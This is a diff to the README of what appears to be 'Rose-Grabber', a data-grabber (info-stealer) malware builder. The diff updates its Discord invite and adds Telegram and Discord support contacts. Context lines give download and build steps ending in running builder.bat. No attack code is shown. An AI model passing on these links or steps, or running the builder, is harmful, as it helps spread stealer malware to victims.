@@ -5,7 +5,7 @@
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
-    <a href="https://discord.gg/sbt9drkvAA">
+    <a href="https://discord.com/invite/KnVcxx4JUJ">
         <img src="https://img.shields.io/badge/Discord-%238B0000.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
     <a href="https://t.me/rosegrabber">
@@ -57,6 +57,11 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 - Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 - Extract packed contents. You can find a guide [here](https://www.top-password.com/knowledge/extract-files-from-zip-in-windows-10.html).
 - Launch UI by executing [`builder.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).
+
+## Issues? Get help!
+**You can contact us here:**
+- [Telegram](https://t.me/gumbobr0t)
+- [Discord](https://discord.com/invite/KnVcxx4JUJ)
 
 ## Preview
 
